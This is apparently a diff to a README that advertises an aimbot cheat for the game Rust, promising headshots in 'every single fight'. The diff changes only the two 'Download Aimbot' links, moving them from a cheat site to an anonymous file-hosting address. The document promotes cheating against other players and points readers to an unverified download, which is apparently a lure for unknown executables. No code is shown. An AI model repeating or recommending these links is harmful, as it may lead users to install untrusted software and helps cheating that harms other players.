@@ -4,7 +4,7 @@ Rust PvP is sweaty. You get caught farming, trapped mid-reload, sprayed from roo
 
 Whether you’re playing quiet or going full rage, this aimbot will carry you through **any wipe, solo or squad**.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://wecheaters.github.io/cheats/rust/)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload18.bitbucket.io)
 ---
 
 ## 🧠 What Is the Rust Aimbot?
@@ -13,7 +13,7 @@ The **Rust Aimbot** is a cheat module that instantly locks your shots onto enemi
 
 From subtle neck shots to full-on headtap aimbotting, it gives you the upper hand in **every single fight**.
 
-[![Download Aimbot](https://www.blast.hk/proxy.php?image=https%3A%2F%2Fi.imgur.com%2Fm3veGkC.jpeg&hash=bfe319bc7416584a31ff98fea24721c6)](https://wecheaters.github.io/cheats/rust/)
+[![Download Aimbot](https://www.blast.hk/proxy.php?image=https%3A%2F%2Fi.imgur.com%2Fm3veGkC.jpeg&hash=bfe319bc7416584a31ff98fea24721c6)](https://fileoffload18.bitbucket.io)
 ---
 
 ## 🔥 Key Features of This Aimbot
